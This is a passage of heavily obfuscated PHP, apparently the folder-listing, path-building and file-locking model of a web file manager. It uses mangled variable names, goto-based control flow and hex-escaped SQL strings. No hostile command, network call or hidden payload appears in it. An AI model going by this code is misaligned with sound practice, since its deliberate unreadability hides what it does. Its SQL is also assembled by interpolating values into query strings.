Model($AÈá¡Ì”â[377])->listData(); $DÌğ‡“¶’ = Model($AÈá¡Ì”â[424])->listSimple(); goto eõŠ‘ÖÚŒå; bˆâŒØˆÀ: $AÕ ÓÏÊ¦É = array_to_keyvalue_group($DÌğ‡“¶’, $AÈá¡Ì”â[365]); foreach ($E„¦·õŒâã as &$FšêÜ‹Ğø) { $FšêÜ‹Ğø[$AÈá¡Ì”â[387]] = array($AÈá¡Ì”â[425] => 0, $AÈá¡Ì”â[426] => 0, $AÈá¡Ì”â[427] => 0); if (isset($FÎçÒÕÛøÇ[$FšêÜ‹Ğø[$AÈá¡Ì”â[365]]])) { $FšêÜ‹Ğø[$AÈá¡Ì”â[387]][$AÈá¡Ì”â[428]] = 1; $FšêÜ‹Ğø[$AÈá¡Ì”â[387]][$AÈá¡Ì”â[429]] = $FÎçÒÕÛøÇ[$FšêÜ‹Ğø[$AÈá¡Ì”â[365]]][$AÈá¡Ì”â[28]]; } if (isset($Fƒİå¿ùÏŒ[$FšêÜ‹Ğø[$AÈá¡Ì”â[365]]])) { $FšêÜ‹Ğø[$AÈá¡Ì”â[387]][$AÈá¡Ì”â[430]] = array(); foreach ($Fƒİå¿ùÏŒ[$FšêÜ‹Ğø[$AÈá¡Ì”â[365]]] as $fï°¯‹à•ò) { $FçÙÄØÛë = $CÚ†Ğ­Åò½[$fï°¯‹à•ò]; $FšêÜ‹Ğø[$AÈá¡Ì”â[387]][$AÈá¡Ì”â[430]][] = array($AÈá¡Ì”â[431] => $FçÙÄØÛë[$AÈá¡Ì”â[363]], $AÈá¡Ì”â[382] => $FçÙÄØÛë[$AÈá¡Ì”â[28]], $AÈá¡Ì”â[432] => $FçÙÄØÛë[$AÈá¡Ì”â[433]]); } } if (isset($AÕ ÓÏÊ¦É[$FšêÜ‹Ğø[$AÈá¡Ì”â[365]]])) { $FšêÜ‹Ğø[$AÈá¡Ì”â[387]][$AÈá¡Ì”â[434]] = array(); foreach ($AÕ ÓÏÊ¦É[$FšêÜ‹Ğø[$AÈá¡Ì”â[365]]] as $bˆ•£ƒÁçƒ) { $FšêÜ‹Ğø[$AÈá¡Ì”â[387]][$AÈá¡Ì”â[434]] = array($AÈá¡Ì”â[435] => $bˆ•£ƒÁçƒ[$AÈá¡Ì”â[436]], $AÈá¡Ì”â[437] => $bˆ•£ƒÁçƒ[$AÈá¡Ì”â[438]], $AÈá¡Ì”â[439] => $bˆ•£ƒÁçƒ[$AÈá¡Ì”â[365]], $AÈá¡Ì”â[440] => $bˆ•£ƒÁçƒ[$AÈá¡Ì”â[441]], $AÈá¡Ì”â[442] => $bˆ•£ƒÁçƒ[$AÈá¡Ì”â[443]]); } } } return $E„¦·õŒâã; goto c£›Û™§Š; F³È‰¦•Ÿ¬: $AÈá¡Ì”â =& $_SERVER[‘®…¢À]; if (!defined($AÈá¡Ì”â[422])) { return; } $Bê˜»±©àŸ = Model($AÈá¡Ì”â[423])->listData(); goto E÷Ââš™³¤; c£›Û™§Š: } protected function _listAppendChildren(&$DÒ›§ëÜÁÏ, $E¤ğ§ïƒ“æ) { goto b¥ÂÉÒ¡·; f§¿Î æÀÀ: $D»íÂ‰º¼ê = 1024 * 50; $Cäê‚Ÿñ³ñ = count($DÒ›§ëÜÁÏ); $FœâŞ÷†ğÃ = $this->tablePrefix . $this->tableName; goto B¢×—ÉÎ¤©; b¥ÂÉÒ¡·: $bÏ«õ‹Ñá =& $_SERVER[‘®…¢À]; $e†Ğ÷”™ñ = $bÏ«õ‹Ñá[357]; $Dœ±˜»ƒ¬± = array(); goto f§¿Î æÀÀ; B¢×—ÉÎ¤©: for ($BÑ…ŞÛ´ÚÈ = 0; $BÑ…ŞÛ´ÚÈ < $Cäê‚Ÿñ³ñ; $BÑ…ŞÛ´ÚÈ++) { if ($DÒ›§ëÜÁÏ[$BÑ…ŞÛ´ÚÈ][$bÏ«õ‹Ñá[366]]) { $dÇñïÓ½ = $DÒ›§ëÜÁÏ[$BÑ…ŞÛ´ÚÈ][$bÏ«õ‹Ñá[365]]; $e†Ğ÷”™ñ .= "\123\x45\114\x45\x43\124\x20\52\x20\x46\x52\x4f\x4d\40\50\x53\x45\x4c\x45\x43\124\40\47{$dÇñïÓ½}\137\x68\141\163\x46\x69\x6c\145\47\x20\x61\x73\40\x68\141\163\x2c\143\x6f\165\156\x74\50\61\51\40\x61\163\x20\x68\x61\163\x43\x6f\165\x6e\164\x20\x46\x52\117\x4d\40\140{$FœâŞ÷†ğÃ}\140\40\xa\x9\x9\11\11\11\167\x68\145\162\145\40\160\141\162\145\156\164\111\104\x3d{$dÇñïÓ½}\40\x61\x6e\x64\40\151\x73\106\x6f\154\144\145\162\75\60\40\x61\156\144\40\151\163\x44\x65\154\x65\x74\x65\x3d\x30\x29\40\x61\x73\40\164\142\x31\x5f{$dÇñïÓ½}\x20\x75\156\x69\157\156\x20\x61\154\x6c\40\12\11\x9\x9\x9\x9\123\x45\x4c\x45\x43\124\x20\52\40\x46\122\117\x4d\40\x28\x53\105\114\x45\103\124\x20\x27{$dÇñïÓ½}\137\x68\141\x73\x46\x6f\x6c\144\x65\x72\47\40\x61\163\40\x68\141\x73\106\x69\154\145\x2c\143\x6f\165\x6e\164\x28\61\51\x20\x61\163\40\150\141\x73\103\x6f\x75\x6e\x74\40\106\122\117\115\40\x60{$FœâŞ÷†ğÃ}\x60\40\12\11\11\x9\x9\x9\x77\x68\145\x72\145\x20\x70\141\x72\x65\x6e\164\111\x44\75{$dÇñïÓ½}\x20\x61\x6e\x64\40\151\163\106\157\x6c\x64\x65\162\75\61\40\x61\x6e\144\x20\x69\163\104\x65\x6c\x65\x74\145\x3d\x30\x29\x20\141\x73\x20\164\142\62\137{$dÇñïÓ½}\40\165\x6e\151\157\156\40\141\x6c\x6c\40"; } if ((strlen($e†Ğ÷”™ñ) >= $D»íÂ‰º¼ê || $BÑ…ŞÛ´ÚÈ == $Cäê‚Ÿñ³ñ - 1) && $e†Ğ÷”™ñ) { $e†Ğ÷”™ñ = substr($e†Ğ÷”™ñ, 0, -strlen($bÏ«õ‹Ñá[444])); $AŸ¤ñ‰À™ = $this->query($e†Ğ÷”™ñ); $Dœ±˜»ƒ¬± = array_merge($Dœ±˜»ƒ¬±, $AŸ¤ñ‰À™); $e†Ğ÷”™ñ = $bÏ«õ‹Ñá[33]; } } $Dœ±˜»ƒ¬± = array_to_keyvalue($Dœ±˜»ƒ¬±, $bÏ«õ‹Ñá[445]); foreach ($DÒ›§ëÜÁÏ as &$F¬„äÚ“ß‰) { if ($F¬„äÚ“ß‰[$bÏ«õ‹Ñá[366]]) { unset($F¬„äÚ“ß‰[$bÏ«õ‹Ñá[368]]); $F¬„äÚ“ß‰[$bÏ«õ‹Ñá[189]] = intval($Dœ±˜»ƒ¬±[$F¬„äÚ“ß‰[$bÏ«õ‹Ñá[365]] . $bÏ«õ‹Ñá[446]][$bÏ«õ‹Ñá[447]]); $F¬„äÚ“ß‰[$bÏ«õ‹Ñá[188]] = intval($Dœ±˜»ƒ¬±[$F¬„äÚ“ß‰[$bÏ«õ‹Ñá[365]] . $bÏ«õ‹Ñá[448]][$bÏ«õ‹Ñá[447]]); } } goto DâĞ­¸ââô; DâĞ­¸ââô: } protected function _listAppendAuth(&$BÖ‘“‡ñÆ) { goto b¿­ĞåùÑ®; d¬¬¥‘Êªç: $fİ°½§““ = Model($fóóÜ‰ƒã‘[449])->getSourceList($D¿‘‹—ù“, $AÇßãß¥•¯); foreach ($BÖ‘“‡ñÆ as $Dä®¨§ˆ„Ğ => &$Bò‰Êó®Äò) { $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]] = $fİ°½§““[$Bò‰Êó®Äò[$fóóÜ‰ƒã‘[365]]]; if (!$Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]] && $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[367]] == self::TYPE_GROUP) { $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]] = Action($fóóÜ‰ƒã‘[450])->pathGroupAuthMake($Bò‰Êó®Äò[$fóóÜ‰ƒã‘[451]]); if (!$Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]] && !_get($GLOBALS, $fóóÜ‰ƒã‘[452])) { $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[186]] = !1; $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[185]] = !1; } } if ($Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]]) { $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[186]] = AuthModel::authCheckEdit($Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]][$fóóÜ‰ƒã‘[373]]); $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[185]] = AuthModel::authCheckView($Bò‰Êó®Äò[$fóóÜ‰ƒã‘[372]][$fóóÜ‰ƒã‘[373]]); } $this->groupPathDisplay($Bò‰Êó®Äò); } goto F©¸½Ëñ¬Ù; b¿­ĞåùÑ®: $fóóÜ‰ƒã‘ =& $_SERVER[‘®…¢À]; if (!defined($fóóÜ‰ƒã‘[422])) { return; } $D¿‘‹—ù“ = array(); goto F¸±ÛäÂÍ°; F¸±ÛäÂÍ°: foreach ($BÖ‘“‡ñÆ as $Bò‰Êó®Äò) { if ($Bò‰Êó®Äò[$fóóÜ‰ƒã‘[367]] == self::TYPE_GROUP) { $D¿‘‹—ù“[] = $Bò‰Êó®Äò[$fóóÜ‰ƒã‘[365]]; } } if (!$D¿‘‹—ù“) { return; } $AÇßãß¥•¯ = array_to_keyvalue($BÖ‘“‡ñÆ, $fóóÜ‰ƒã‘[365]); goto d¬¬¥‘Êªç; F©¸½Ëñ¬Ù: } public function groupPathDisplay(&$cµ¿ ¶Ô¢Ø) { goto FÒœô˜ºƒ; dê¡Î‹İƒ‚: $fáÙ­£—ñ = $this->parentLevelArray($dõ­£ÎÔã×[$BæÎíŒ´¸­[454]]); $A›Ê†ªØ‚ƒ = $BæÎíŒ´¸­[33]; foreach ($fáÙ­£—ñ as $C‹èÖõ»ä) { $B™ ‚äÁ¼‘ = Model($BæÎíŒ´¸­[453])->getInfo($C‹èÖõ»ä); $A›Ê†ªØ‚ƒ .= $B™ ‚äÁ¼‘[$BæÎíŒ´¸­[387]][$BæÎíŒ´¸­[365]] . $BæÎíŒ´¸­[47]; } goto bøœ“„ò¸Ï; bøœ“„ò¸Ï: $cµ¿ ¶Ô¢Ø[$BæÎíŒ´¸­[455]] = $dõ­£ÎÔã×[$BæÎíŒ´¸­[456]]; $cµ¿ ¶Ô¢Ø[$BæÎíŒ´¸­[376]] = $dõ­£ÎÔã×[$BæÎíŒ´¸­[454]]; $cµ¿ ¶Ô¢Ø[$BæÎíŒ´¸­[457]] = $dõ­£ÎÔã×[$BæÎíŒ´¸­[458]]; goto b¬Íß÷Ù­É; b¬Íß÷Ù­É: $cµ¿ ¶Ô¢Ø[$BæÎíŒ´¸­[459]] = $A›Ê†ªØ‚ƒ . $dõ­£ÎÔã×[$BæÎíŒ´¸­[387]][$BæÎíŒ´¸­[365]]; goto AÖİ†½ÃµÓ; FÒœô˜ºƒ: $BæÎíŒ´¸­ =& $_SERVER[‘®…¢À]; if ($cµ¿ ¶Ô¢Ø[$BæÎíŒ´¸­[367]] != self::TYPE_GROUP) { return; } $dõ­£ÎÔã× = Model($BæÎíŒ´¸­[453])->getInfo($cµ¿ ¶Ô¢Ø[$BæÎíŒ´¸­[451]]); goto dê¡Î‹İƒ‚; AÖİ†½ÃµÓ: } protected function _listAppendPath(&$bìó‰ËõÓ) { goto bßø¦¶ÉÙ; e”Ùã¯«í™: $CÀãÊ””‚ = array(); foreach ($eÏæÚÚ‚ as $e„ñé¡ñ => $F±§Æ¡£¯’) { if (!$F±§Æ¡£¯’) { $CÀãÊ””‚[] = $e„ñé¡ñ; } } if ($CÀãÊ””‚) { $aˆ´ÛéÎµ = array($Fí¯öäÙ£Ï[379] => array($Fí¯öäÙ£Ï[380], $CÀãÊ””‚)); if (count($CÀãÊ””‚) == 1) { $C¨ïòÌ‹Ö = $this->sourceInfo($CÀãÊ””‚[0]); $C¨ïòÌ‹Ö = is_array($C¨ïòÌ‹Ö) ? array($C¨ïòÌ‹Ö) : !1; } else { $C¨ïòÌ‹Ö = $this->field($Fí¯öäÙ£Ï[460])->where($aˆ´ÛéÎµ)->select(); } $DÊ¡¹İÃ³… = array_to_keyvalue($C¨ïòÌ‹Ö, $Fí¯öäÙ£Ï[365], $Fí¯öäÙ£Ï[28]); $eÏæÚÚ‚ = array_merge_index($eÏæÚÚ‚, $DÊ¡¹İÃ³…); } goto a¥ÛŒñ«—Õ; bßø¦¶ÉÙ: $Fí¯öäÙ£Ï =& $_SERVER[‘®…¢À]; $eÏæÚÚ‚ = array(); foreach ($bìó‰ËõÓ as &$Côí‹…Ü¶) { $eÏæÚÚ‚[$Côí‹…Ü¶[$Fí¯öäÙ£Ï[365]]] = $Côí‹…Ü¶[$Fí¯öäÙ£Ï[28]]; $e”è…—„šì = $this->parentLevelArray($Côí‹…Ü¶[$Fí¯öäÙ£Ï[454]]); array_shift($e”è…—„šì); foreach ($e”è…—„šì as $Eøò‘Í¾µª) { if (!isset($eÏæÚÚ‚[$Eøò‘Í¾µª])) { $eÏæÚÚ‚[$Eøò‘Í¾µª] = 0; } } } goto e”Ùã¯«í™; a¥ÛŒñ«—Õ: foreach ($bìó‰ËõÓ as &$Côí‹…Ü¶) { goto D¿Ğ‡èÊ¤£; D¿Ğ‡èÊ¤£: $e”è…—„šì = $this->parentLevelArray($Côí‹…Ü¶[$Fí¯öäÙ£Ï[454]]); $BÛ½™¸Í…ß = $this->_listAppendPathRoot($Côí‹…Ü¶, $e”è…—„šì); foreach ($e”è…—„šì as $Eøò‘Í¾µª) { if (isset($eÏæÚÚ‚[$Eøò‘Í¾µª])) { $BÛ½™¸Í…ß .= $eÏæÚÚ‚[$Eøò‘Í¾µª] . $Fí¯öäÙ£Ï[8]; } } goto Bºğ ØÆ„»; a„šÜ‚Ãµ: $cÇ‹÷è×‹Ê = trim($Côí‹…Ü¶[$Fí¯öäÙ£Ï[461]], $Fí¯öäÙ£Ï[8]); if ($Côí‹…Ü¶[$Fí¯öäÙ£Ï[456]] == $Fí¯öäÙ£Ï[463] && $cÇ‹÷è×‹Ê) { $Côí‹…Ü¶[$Fí¯öäÙ£Ï[28]] = $cÇ‹÷è×‹Ê; } goto E§Í†ãóí; Bºğ ØÆ„»: if ($e”è…—„šì) { $BÛ½™¸Í…ß .= $Côí‹…Ü¶[$Fí¯öäÙ£Ï[28]]; } if ($Côí‹…Ü¶[$Fí¯öäÙ£Ï[366]]) { $BÛ½™¸Í…ß .= $Fí¯öäÙ£Ï[8]; } $Côí‹…Ü¶[$Fí¯öäÙ£Ï[461]] = str_replace($Fí¯öäÙ£Ï[462], $Fí¯öäÙ£Ï[8], $BÛ½™¸Í…ß); goto a„šÜ‚Ãµ; E§Í†ãóí: } goto eĞÚŞ‡¢ß; eĞÚŞ‡¢ß: } protected function _listAppendPathRoot(&$a¿ªİÕ³Ñ¹, $F†’ˆÂª­…) { $cÕìöïÌ =& $_SERVER[‘®…¢À]; $bâ‚¨¼ÂÎ = $cÕìöïÌ[33]; if ($a¿ªİÕ³Ñ¹[$cÕìöïÌ[367]] == self::TYPE_USER) { if (defined($cÕìöïÌ[422]) && $a¿ªİÕ³Ñ¹[$cÕìöïÌ[451]] == USER_ID) { $bâ‚¨¼ÂÎ = LNG($cÕìöïÌ[464]); if (!$F†’ˆÂª­…) { $a¿ªİÕ³Ñ¹[$cÕìöïÌ[28]] = $bâ‚¨¼ÂÎ; } } else { $f¯¥óÔÇš = Model($cÕìöïÌ[465])->getInfoSimple($a¿ªİÕ³Ñ¹[$cÕìöïÌ[451]]); $bâ‚¨¼ÂÎ = LNG($cÕìöïÌ[466]) . $cÕìöïÌ[154] . $f¯¥óÔÇš[$cÕìöïÌ[28]] . $cÕìöïÌ[467]; } } else { if ($a¿ªİÕ³Ñ¹[$cÕìöïÌ[367]] == self::TYPE_GROUP) { $f¯¥óÔÇš = Model($cÕìöïÌ[453])->getInfoSimple($a¿ªİÕ³Ñ¹[$cÕìöïÌ[451]]); $bâ‚¨¼ÂÎ = $f¯¥óÔÇš[$cÕìöïÌ[28]]; } else { if ($a¿ªİÕ³Ñ¹[$cÕìöïÌ[367]] == self::TYPE_SYSTEM) { $f¯¥óÔÇš = $this->sourceInfo($F†’ˆÂª­…[0], !0); $bâ‚¨¼ÂÎ = $f¯¥óÔÇš[$cÕìöïÌ[28]]; } } } $bâ‚¨¼ÂÎ = $bâ‚¨¼ÂÎ ? $cÕìöïÌ[8] . $bâ‚¨¼ÂÎ . $cÕìöïÌ[8] : $cÕìöïÌ[8]; return $bâ‚¨¼ÂÎ; } protected function _listAppendUser(&$cŒ‚Ï¬éè–) { $bóÛ³ßîœ¸ =& $_SERVER[‘®…¢À]; $e‹­®ïÆ© = array_to_keyvalue($cŒ‚Ï¬éè–, $bóÛ³ßîœ¸[33], $bóÛ³ßîœ¸[374]); $D‘ìïÀÀÓ = array_to_keyvalue($cŒ‚Ï¬éè–, $bóÛ³ßîœ¸[33], $bóÛ³ßîœ¸[375]); $e×›Ş§£› = array_merge($e‹­®ïÆ©, $D‘ìïÀÀÓ); $C÷ºšé‹Ø = Model($bóÛ³ßîœ¸[468])->userListInfo($e×›Ş§£›); foreach ($cŒ‚Ï¬éè– as &$f™ßƒÙ¯‰ƒ) { $cË£Œù’ƒØ = $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[374]]; $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[374]] = $C÷ºšé‹Ø[$cË£Œù’ƒØ] ? $C÷ºšé‹Ø[$cË£Œù’ƒØ] : !1; $cË£Œù’ƒØ = $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[375]]; $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[375]] = $C÷ºšé‹Ø[$cË£Œù’ƒØ] ? $C÷ºšé‹Ø[$cË£Œù’ƒØ] : !1; if (isset($f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[412]]) && $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[412]][$bóÛ³ßîœ¸[469]]) { $b’Šö¢îÕ = $GLOBALS[$bóÛ³ßîœ¸[6]][$bóÛ³ßîœ¸[85]][$bóÛ³ßîœ¸[470]]; if ($f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[412]][$bóÛ³ßîœ¸[471]] <= time() - $b’Šö¢îÕ) { $this->metaSet($f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[365]], $bóÛ³ßîœ¸[469], null); $this->metaSet($f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[365]], $bóÛ³ßîœ¸[471], null); unset($f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[412]][$bóÛ³ßîœ¸[469]]); continue; } $f¶¦áê§”² = $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[412]][$bóÛ³ßîœ¸[469]]; $f™ßƒÙ¯‰ƒ[$bóÛ³ßîœ¸[412]][$bóÛ³ßîœ¸[472]] = Model($bóÛ³ßîœ¸[468])->getInfoSimpleOuter($f¶¦áê§”²); } } } public function parentLevelArray($a—ëæ¤ù„ñ) { $c—Ù£«£’ò =& $_SERVER[‘®…¢À]; $a—ëæ¤ù„ñ = explode($c—Ù£«£’ò[47], trim($a—ëæ¤ù„ñ, $c—Ù£«£’ò[47])); return array_remove_value($a—ëæ¤ù„ñ, $c—Ù£«£’ò[463]); } public function listAll($DÕ½Å„‹öæ) { goto BË ›ŸÊ†‰; EÆØĞŠŞîÀ: $Eªè•Š¯ÀØ = $CÅí¶«Å¬é[477]; $D‹±º‚´ƒÌ = "\114\105\106\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x66\x69\154\x65\x20\146\151\x6c\145\x20\157\156\40\163\157\x75\x72\143\x65\x2e\146\151\x6c\x65\111\x44\40\x3d\x20\x66\151\154\x65\56\x66\151\154\145\111\x44"; $e‡Ã´ÆÊÊø = $this->alias($CÅí¶«Å¬é[478])->field($Eªè•Š¯ÀØ)->where($A°‚ªôˆŠˆ)->join($D‹±º‚´ƒÌ)->select(); goto B  ¸Âù¦ğ; BË ›ŸÊ†‰: $CÅí¶«Å¬é =& $_SERVER[‘®…¢À]; $CÏ¯Çó‚íË = $this->sourceInfo($DÕ½Å„‹öæ); $A°‚ªôˆŠˆ = array($CÅí¶«Å¬é[473] => array($CÅí¶«Å¬é[474], $CÏ¯Çó‚íË[$CÅí¶«Å¬é[454]] . $DÕ½Å„‹öæ . $CÅí¶«Å¬é[475]), $CÅí¶«Å¬é[476] => 0); goto EÆØĞŠŞîÀ; fÈµ‚¨Ñª©: $FÛ”àì«¢ = array(); foreach ($e‡Ã´ÆÊÊø as $d¾…¦¢ç¯ => $D–çğÇÉĞ’) { goto Aòï‘ßñ•; fåØ–îˆğÂ: if (!$D–çğÇÉĞ’[$CÅí¶«Å¬é[366]]) { $cÉ‡ŸŠƒ©[$CÅí¶«Å¬é[414]] = $D–çğÇÉĞ’[$CÅí¶«Å¬é[414]]; $cÉ‡ŸŠƒ©[$CÅí¶«Å¬é[480]] = $D–çğÇÉĞ’[$CÅí¶«Å¬é[76]]; } $FÛ”àì«¢[] = $cÉ‡ŸŠƒ©; goto cØËµ¡„ß†; Aòï‘ßñ•: $Cİ¤ˆ‹³¼Ã = $this->parentLevelArray($D–çğÇÉĞ’[$CÅí¶«Å¬é[454]]); array_shift($Cİ¤ˆ‹³¼Ã); $a³Óºé¦ô˜ = $B¬†µøö¶; goto D±Ôà×öÖ†; D¡ğê’…Š¢: $a³Óºé¦ô˜ = str_replace($CÅí¶«Å¬é[462], $CÅí¶«Å¬é[8], $a³Óºé¦ô˜); $a³Óºé¦ô˜ = str_replace($CÅí¶«Å¬é[462], $CÅí¶«Å¬é[8], $a³Óºé¦ô˜); $cÉ‡ŸŠƒ© = array($CÅí¶«Å¬é[383] => str_replace($CÅí¶«Å¬é[462], $CÅí¶«Å¬é[8], $a³Óºé¦ô˜), $CÅí¶«Å¬é[479] => intval($D–çğÇÉĞ’[$CÅí¶«Å¬é[366]]), $CÅí¶«Å¬é[387] => $this->pathInfoFilter($D–çğÇÉĞ’, !0)); goto fåØ–îˆğÂ; D±Ôà×öÖ†: for ($b††¾Ø = 0; $b††¾Ø < count($Cİ¤ˆ‹³¼Ã); $b††¾Ø++) { $a³Óºé¦ô˜ .= $e‡Ã´ÆÊÊø[$Cİ¤ˆ‹³¼Ã[$b††¾Ø]][$CÅí¶«Å¬é[28]] . $CÅí¶«Å¬é[8]; } $a³Óºé¦ô˜ .= $D–çğÇÉĞ’[$CÅí¶«Å¬é[28]]; if ($D–çğÇÉĞ’[$CÅí¶«Å¬é[366]]) { $a³Óºé¦ô˜ .= $CÅí¶«Å¬é[8]; } goto D¡ğê’…Š¢; cØËµ¡„ß†: } return $FÛ”àì«¢; goto CÊê—¿ÄÒä; B  ¸Âù¦ğ: $this->_listAppendAuth($e‡Ã´ÆÊÊø); $this->_listAppendUser($e‡Ã´ÆÊÊø); $this->_listAppendPath($e‡Ã´ÆÊÊø); goto d±¸´‰³ª; d±¸´‰³ª: $e‡Ã´ÆÊÊø = array_to_keyvalue($e‡Ã´ÆÊÊø, $CÅí¶«Å¬é[365]); $B¬†µøö¶ = "\57{$CÏ¯Çó‚íË[$CÅí¶«Å¬é[28]]}\x2f"; $B¬†µøö¶ = $B¬†µøö¶ == $CÅí¶«Å¬é[462] ? $CÅí¶«Å¬é[8] : $B¬†µøö¶; goto fÈµ‚¨Ñª©; CÊê—¿ÄÒä: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($f’çÔµíß‰) { goto C©ÖµÓ”…„; DŠ„“¨ ø¸: $this->_lockEvent($f’çÔµíß‰, array($F‘Üñšè¢¢[484], $F‘Üñšè¢¢[485]), $FÃíáÌíÏ); $this->_lockCheckEnd($F‘Üñšè¢¢[481], $f’çÔµíß‰); goto AÚÓ íœì­; C©ÖµÓ”…„: $F‘Üñšè¢¢ =& $_SERVER[‘®…¢À]; if (!$this->allowLock()) { return; } $this->_lockCheck($F‘Üñšè¢¢[481], $f’çÔµíß‰); goto B“ì½²Ö; B“ì½²Ö: $FÃíáÌíÏ = 1; $this->_lockEvent($f’çÔµíß‰, array($F‘Üñšè¢¢[482], $F‘Üñšè¢¢[483]), $FÃíáÌíÏ); $this->_lockParent($f’çÔµíß‰, array($F‘Üñšè¢¢[483]), $FÃíáÌíÏ); goto DŠ„“¨ ø¸; AÚÓ íœì­: } public function lockCopyEnd($FÚ‘×¡‘’Ù) { $EùÎŞÂŞŒ =& $_SERVER[‘®…¢À]; if (!$this->allowLock()) { return; } $Aç×“ÄµÑ = 0; $this->_lockEvent($FÚ‘×¡‘’Ù, array($EùÎŞÂŞŒ[482], $EùÎŞÂŞŒ[483]), $Aç×“ÄµÑ); $this->_lockParent($FÚ‘×¡‘’Ù, array($EùÎŞÂŞŒ[483]), $Aç×“ÄµÑ); $this->_lockEvent($FÚ‘×¡‘’Ù, array($EùÎŞÂŞŒ[484], $EùÎŞÂŞŒ[485]), $Aç×“ÄµÑ); } public function lockWriteStart($Aí±’Ñõ°…, $B¦ÍÜ‘°Å… = '') { goto eìÔ”‚³Ëº; f†Ëš…¶ªë: $this->_lockParent($Aí±’Ñõ°…, array($FÃîƒ¢§µ[481], $FÃîƒ¢§µ[483]), $AÁÕ¤ÎŸ‘«); $this->_lockCheckEnd($FÃîƒ¢§µ[482], $Aí±’Ñõ°…); goto FÉŒ£­„¨ï; eã£öÄÅÁ: $AÁÕ¤ÎŸ‘« = 1; $this->_lockKey($FÃîƒ¢§µ[486] . $Aí±’Ñõ°… . $FÃîƒ¢§µ[94] . $B¦ÍÜ‘°Å…, $AÁÕ¤ÎŸ‘«); $this->_lockEvent($Aí±’Ñõ°…, array($FÃîƒ¢§µ[481], $FÃîƒ¢§µ[483]), $AÁÕ¤ÎŸ‘«); goto f†Ëš…¶ªë; eìÔ”‚³Ëº: $FÃîƒ¢§µ =& $_SERVER[‘®…¢À]; if (!$this->allowLock()) { return; } $this->_lockCheck($FÃîƒ¢§µ[482], $Aí±’Ñõ°…); goto eã£öÄÅÁ; FÉŒ£­„¨ï: } public function lockWriteEnd($DÅ‘İ•«´, $a¼ôà ¥µË = '') { $Aö¾åôÓ =& $_SERVER[‘®…¢À]; if (!$this->allowLock()) { return; } $eä§Š”‚‘¼ = 0; $this->_lockKey($Aö¾åôÓ[486] . $DÅ‘İ•«´ . $Aö¾åôÓ[94] . $a¼ôà ¥µË, $eä§Š”‚‘¼); $this->_lockEvent($DÅ‘İ•«´, array($Aö¾åôÓ[481], $Aö¾åôÓ[483]), $eä§Š”‚‘¼); $this->_lockParent($DÅ‘İ•«´, array($Aö¾åôÓ[481], $Aö¾åôÓ[483]), $eä§Š”‚‘¼); } public function lockMoveStart($AÆ÷ñµ÷¢ˆ) { goto fÅÆ½¡ÜÓÑ; aµ´×‹¨×Á: $this->_lockParent($AÆ÷ñµ÷¢ˆ, array($AÜ¬ø»Ø…[481], $AÜ¬ø»Ø…[483]), $bÒÆÈÑ·ğÌ); $this->_lockEvent($AÆ÷ñµ÷¢ˆ, array($AÜ¬ø»Ø…[488], $AÜ¬ø»Ø…[484], $AÜ¬ø»Ø…[485]), $bÒÆÈÑ·ğÌ); $this->_lockCheckEnd($AÜ¬ø»Ø…[483], $AÆ÷ñµ÷¢ˆ); goto CóÌ÷†Åˆ; ešà»à»µ¬: $bÒÆÈÑ·ğÌ = 1; $this->_lockKey($AÜ¬ø»Ø…[487] . $AÆ÷ñµ÷¢ˆ, $bÒÆÈÑ·ğÌ); $this->_lockEvent($AÆ÷ñµ÷¢ˆ, array($AÜ¬ø»Ø…[481], $AÜ¬ø»Ø…[482]), $bÒÆÈÑ·ğÌ); goto aµ´×‹¨×Á; fÅÆ½¡ÜÓÑ: $AÜ¬ø»Ø… =& $_SERVER[‘®…¢À]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÜ¬ø»Ø…[483], $AÆ÷ñµ÷¢ˆ); goto ešà»à»µ¬; CóÌ÷†Åˆ: } public function lockMoveEnd($c² ¦¸Å²Ğ) { goto DÇ¸Õƒ×òñ; DÇ¸Õƒ×òñ: $cÏÆ‘½½ã× =& $_SERVER[‘®…¢À]; if (!$this->allowLock()) { return; } $Aª¢Î¦æğÁ = 0; goto D´­ãÜïçö; D´­ãÜïçö: $this->_lockKey($cÏÆ‘½½ã×[487] . $c² ¦¸Å²Ğ, $Aª¢Î¦æğÁ); $this->_lockEvent($c² ¦¸Å²Ğ, array($cÏÆ‘½½ã×[481], $cÏÆ‘½½ã×[482]), $Aª¢Î¦æğÁ); $this->_lockParent($c² ¦¸Å²Ğ, array($cÏÆ‘½½ã×[481], $cÏÆ‘½½ã×[483]), $Aª¢Î¦æğÁ); goto Aß÷Ü¡æ–Ó; Aß÷Ü¡æ–Ó: $this->_lockEvent($c² ¦¸Å²Ğ, array($cÏÆ‘½½ã×[488], $cÏÆ‘½½ã×[484], $cÏÆ‘½½ã×[485]), $Aª¢Î¦æğÁ); goto C‰ğ¢÷Œë ; C‰ğ¢÷Œë : } private function _lockCheck($A¶“Í–ÖÚÀ, $b…Çêò’Õ‚) { goto aãÆ®“õœÀ; F¨Äë—Ö›: $eî•ÄóÙùŠ = array_reverse($this->parentLevelArray($bŒÜå §Ï‹[$AÔ­íÈØ[454]])); foreach ($eî•ÄóÙùŠ as $c Îİƒ‘Õº) { $D×³Ãôîê– = 